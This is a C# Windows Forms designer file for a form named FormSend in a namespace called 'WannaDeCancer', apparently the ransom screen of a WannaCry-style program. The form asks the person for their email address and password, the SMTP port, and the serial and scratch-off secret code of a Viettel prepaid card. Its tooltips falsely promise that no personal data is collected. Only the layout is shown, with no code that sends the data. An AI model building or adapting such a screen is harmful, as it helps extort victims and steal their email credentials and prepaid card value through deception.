namespace WannaDeCancer
{
    partial class FormSend
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.lbTitle = new System.Windows.Forms.Label();
            this.lbSubTitle = new System.Windows.Forms.Label();
            this.txbEmailAddress = new System.Windows.Forms.TextBox();
            this.lbDesEmailAddress = new System.Windows.Forms.Label();
            this.lbDesPassWord = new System.Windows.Forms.Label();
            this.txbPassword = new System.Windows.Forms.TextBox();
            this.txbPort = new System.Windows.Forms.TextBox();
            this.lbDesPort = new System.Windows.Forms.Label();
            this.tt = new System.Windows.Forms.ToolTip(this.components);
            this.lbViettelSerial = new System.Windows.Forms.Label();
            this.txbViettelSerial = new System.Windows.Forms.TextBox();
            this.txbCode = new System.Windows.Forms.TextBox();
            this.txbNotes = new System.Windows.Forms.TextBox();
            this.lbViettelCode = new System.Windows.Forms.Label();
            this.lbDesNotes = new System.Windows.Forms.Label();
            this.btnSend = new System.Windows.Forms.Button();
            this.SuspendLayout();
            // 
            // lbTitle
            // 
            this.lbTitle.AutoSize = true;
            this.lbTitle.Font = new System.Drawing.Font("Segoe UI", 24F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lbTitle.ForeColor = System.Drawing.SystemColors.ButtonFace;
            this.lbTitle.Location = new System.Drawing.Point(13, 13);
            this.lbTitle.Name = "lbTitle";
            this.lbTitle.Size = new System.Drawing.Size(253, 45);
            this.lbTitle.TabIndex = 0;
            this.lbTitle.Text = "Let Get Started:";
            // 
            // lbSubTitle
            // 
            this.lbSubTitle.AutoSize = true;
            this.lbSubTitle.Font = new System.Drawing.Font("Segoe UI Semibold", 12F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lbSubTitle.ForeColor = System.Drawing.SystemColors.ButtonFace;
            this.lbSubTitle.Location = new System.Drawing.Point(13, 58);
            this.lbSubTitle.Name = "lbSubTitle";
            this.lbSubTitle.Size = new System.Drawing.Size(442, 21);
            this.lbSubTitle.TabIndex = 1;
            this.lbSubTitle.Text = "Send us your Information as mention in the previous textbox";
            // 
            // txbEmailAddress
            // 
            this.txbEmailAddress.Location = new System.Drawing.Point(174, 100);
            this.txbEmailAddress.Name = "txbEmailAddress";
            this.txbEmailAddress.Size = new System.Drawing.Size(525, 29);
            this.txbEmailAddress.TabIndex = 2;
            this.tt.SetToolTip(this.txbEmailAddress, "Please Enter Your Email Address here. \r\nWe promise that we will not collect  your" +
        " personal data");
            // 
            // lbDesEmailAddress
            // 
            this.lbDesEmailAddress.AutoSize = true;
            this.lbDesEmailAddress.Font = new System.Drawing.Font("Segoe UI Semibold", 12F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lbDesEmailAddress.ForeColor = System.Drawing.SystemColors.ButtonFace;
            this.lbDesEmailAddress.Location = new System.Drawing.Point(12, 103);
            this.lbDesEmailAddress.Name = "lbDesEmailAddress";
            this.lbDesEmailAddress.Size = new System.Drawing.Size(151, 21);
            this.lbDesEmailAddress.TabIndex = 3;
            this.lbDesEmailAddress.Text = "Your email address:";
            this.tt.SetToolTip(this.lbDesEmailAddress, "Please Enter Your Email Address here. \r\nWe promise that we will not collect  your" +
        " personal data");
            // 
            // lbDesPassWord
            // 
            this.lbDesPassWord.AutoSize = true;
            this.lbDesPassWord.Font = new System.Drawing.Font("Segoe UI Semibold", 12F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lbDesPassWord.ForeColor = System.Drawing.SystemColors.ButtonFace;
            this.lbDesPassWord.Location = new System.Drawing.Point(12, 138);
            this.lbDesPassWord.Name = "lbDesPassWord";
            this.lbDesPassWord.Size = new System.Drawing.Size(83, 21);
            this.lbDesPassWord.TabIndex = 4;
            this.lbDesPassWord.Text = "Password:";
            this.tt.SetToolTip(this.lbDesPassWord, "Please Enter your password\r\nWe promise that we will not collect your personal inf" +
        "ormation");
            // 
            // txbPassword
            // 
            this.txbPassword.Location = new System.Drawing.Point(174, 135);
            this.txbPassword.Name = "txbPassword";
            this.txbPassword.Size = new System.Drawing.Size(525, 29);
            this.txbPassword.TabIndex = 5;
            this.tt.SetToolTip(this.txbPassword, "Please Enter your password\r\nWe promise that we will not collect your personal inf" +
        "ormation");
            // 
            // txbPort
            // 
            this.txbPort.Location = new System.Drawing.Point(174, 170);
            this.txbPort.Name = "txbPort";
            this.txbPort.Size = new System.Drawing.Size(525, 29);
            this.txbPort.TabIndex = 6;
            this.tt.SetToolTip(this.txbPort, "Please enter your Email Services Provider Port, We currently set port to 587\r\nIf " +
        "you don\'t use Gmail, go to google and search you email service provider port and" +
        " type in here");
            // 
            // lbDesPort
            // 
            this.lbDesPort.AutoSize = true;
            this.lbDesPort.Font = new System.Drawing.Font("Segoe UI Semibold", 12F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lbDesPort.ForeColor = System.Drawing.SystemColors.ButtonFace;
            this.lbDesPort.Location = new System.Drawing.Point(12, 173);
            this.lbDesPort.Name = "lbDesPort";
            this.lbDesPort.Size = new System.Drawing.Size(45, 21);
            this.lbDesPort.TabIndex = 7;
            this.lbDesPort.Text = "Port:";
            this.tt.SetToolTip(this.lbDesPort, "Please enter your Email Services Provider Port, We currently set port to 587\\r\\nI" +
        "f you don\'t use Gmail, go to google and search you email service provider port a" +
        "nd type in here");
            // 
            // tt
            // 
            this.tt.AutoPopDelay = 3000;
            this.tt.InitialDelay = 500;
            this.tt.ReshowDelay = 100;
            // 
            // lbViettelSerial
            // 
            this.lbViettelSerial.AutoSize = true;
            this.lbViettelSerial.Font = new System.Drawing.Font("Segoe UI Semibold", 12F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lbViettelSerial.ForeColor = System.Drawing.SystemColors.ButtonFace;
            this.lbViettelSerial.Location = new System.Drawing.Point(12, 208);
            this.lbViettelSerial.Name = "lbViettelSerial";
            this.lbViettelSerial.Size = new System.Drawing.Size(103, 21);
            this.lbViettelSerial.TabIndex = 8;
            this.lbViettelSerial.Text = "Viettel Serial";
            this.tt.SetToolTip(this.lbViettelSerial, "This is the series of character (including number) found in the back side of your" +
        " card");
            // 
            // txbViettelSerial
            // 
            this.txbViettelSerial.Location = new System.Drawing.Point(174, 205);
            this.txbViettelSerial.Name = "txbViettelSerial";
            this.txbViettelSerial.Size = new System.Drawing.Size(525, 29);
            this.txbViettelSerial.TabIndex = 9;
            this.tt.SetToolTip(this.txbViettelSerial, "This is the series of character (including number) found in the back side of your" +
        " card");
            // 
            // txbCode
            // 
            this.txbCode.Location = new System.Drawing.Point(174, 240);
            this.txbCode.Name = "txbCode";
            this.txbCode.Size = new System.Drawing.Size(525, 29);
            this.txbCode.TabIndex = 10;
            this.tt.SetToolTip(this.txbCode, "This is the series of numbers found below the silver layer of your card");
            // 
            // txbNotes
            // 
            this.txbNotes.Location = new System.Drawing.Point(174, 285);
            this.txbNotes.Multiline = true;
            this.txbNotes.Name = "txbNotes";
            this.txbNotes.Size = new System.Drawing.Size(525, 287);
            this.txbNotes.TabIndex = 11;
            this.tt.SetToolTip(this.txbNotes, "Give note for us");
            // 
            // lbViettelCode
            // 
            this.lbViettelCode.AutoSize = true;
            this.lbViettelCode.Font = new System.Drawing.Font("Segoe UI Semibold", 12F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lbViettelCode.ForeColor = System.Drawing.SystemColors.ButtonFace;
            this.lbViettelCode.Location = new System.Drawing.Point(12, 243);
            this.lbViettelCode.Name = "lbViettelCode";
            this.lbViettelCode.Size = new System.Drawing.Size(145, 21);
            this.lbViettelCode.TabIndex = 12;
            this.lbViettelCode.Text = "Viettel Secret Code";
            this.tt.SetToolTip(this.lbViettelCode, "This is the series of numbers found below the silver layer of your card");
            // 
            // lbDesNotes
            // 
            this.lbDesNotes.AutoSize = true;
            this.lbDesNotes.Font = new System.Drawing.Font("Segoe UI Semibold", 12F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lbDesNotes.ForeColor = System.Drawing.SystemColors.ButtonFace;
            this.lbDesNotes.Location = new System.Drawing.Point(13, 285);
            this.lbDesNotes.Name = "lbDesNotes";
            this.lbDesNotes.Size = new System.Drawing.Size(56, 21);
            this.lbDesNotes.TabIndex = 13;
            this.lbDesNotes.Text = "Notes:";
            this.tt.SetToolTip(this.lbDesNotes, "Give note for us");
            // 
            // btnSend
            // 
            this.btnSend.Location = new System.Drawing.Point(608, 589);
            this.btnSend.Name = "btnSend";
            this.btnSend.Size = new System.Drawing.Size(91, 31);
            this.btnSend.TabIndex = 14;
            this.btnSend.Text = "Send";
            this.btnSend.UseVisualStyleBackColor = true;
            // 
            // FormSend
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(9F, 21F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.DarkRed;
            this.ClientSize = new System.Drawing.Size(711, 632);
            this.Controls.Add(this.btnSend);
            this.Controls.Add(this.lbDesNotes);
            this.Controls.Add(this.lbViettelCode);
            this.Controls.Add(this.txbNotes);
            this.Controls.Add(this.txbCode);
            this.Controls.Add(this.txbViettelSerial);
            this.Controls.Add(this.lbViettelSerial);
            this.Controls.Add(this.lbDesPort);
            this.Controls.Add(this.txbPort);
            this.Controls.Add(this.txbPassword);
            this.Controls.Add(this.lbDesPassWord);
            this.Controls.Add(this.lbDesEmailAddress);
            this.Controls.Add(this.txbEmailAddress);
            this.Controls.Add(this.lbSubTitle);
            this.Controls.Add(this.lbTitle);
            this.Font = new System.Drawing.Font("Segoe UI", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.Name = "FormSend";
            this.Text = "Send";
            this.tt.SetToolTip(this, "Give note for us");
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Label lbTitle;
        private System.Windows.Forms.Label lbSubTitle;
        private System.Windows.Forms.TextBox txbEmailAddress;
        private System.Windows.Forms.Label lbDesEmailAddress;
        private System.Windows.Forms.Label lbDesPassWord;
        private System.Windows.Forms.TextBox txbPassword;
        private System.Windows.Forms.ToolTip tt;
        private System.Windows.Forms.TextBox txbPort;
        private System.Windows.Forms.Label lbDesPort;
        private System.Windows.Forms.Label lbViettelSerial;
        private System.Windows.Forms.TextBox txbViettelSerial;
        private System.Windows.Forms.TextBox txbCode;
        private System.Windows.Forms.TextBox txbNotes;
        private System.Windows.Forms.Label lbViettelCode;
        private System.Windows.Forms.Label lbDesNotes;
        private System.Windows.Forms.Button btnSend;
    }
}